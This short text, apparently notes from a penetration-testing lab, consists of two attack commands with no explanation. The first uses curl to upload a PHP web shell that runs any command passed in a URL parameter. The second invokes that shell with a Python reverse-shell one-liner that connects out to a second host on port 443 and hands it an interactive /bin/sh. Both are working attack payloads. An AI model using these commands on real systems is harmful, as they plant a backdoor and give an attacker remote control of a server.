


    curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' 192.168.30.134/test/cmd.php



192.168.30.134/test/cmd.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.30.131",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
